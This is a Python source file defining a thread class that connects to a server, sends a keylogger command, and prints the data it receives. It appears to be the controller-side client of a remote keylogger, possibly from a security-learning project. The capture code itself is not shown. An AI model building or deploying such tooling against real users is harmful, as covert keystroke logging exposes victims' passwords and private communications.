import threading
import time
from PythonSecurity.utils import *
from config import KEYLOGGER_OPTION

class KeyloggerThread(threading.Thread):
    def __init__(self):
        super().__init__()
        self.client_socket = make_and_connect_unblocked_socket_to_server()
        self.disconnect_socket = threading.Event()

    def run(self):
        time.sleep(0.1)
        send_to_server(self.client_socket, KEYLOGGER_OPTION)

        while not self.disconnect_socket.is_set():
            try:
                data = receive_from_server(self.client_socket)
                print(f"Received: {data}")
            except (BlockingIOError, ConnectionResetError, BrokenPipeError):
                pass

        print("Keylogger thread is stopping")

    def stop(self):
        self.disconnect_socket.set()
        self.join()
        self.client_socket.close()
        self.disconnect_socket.clear()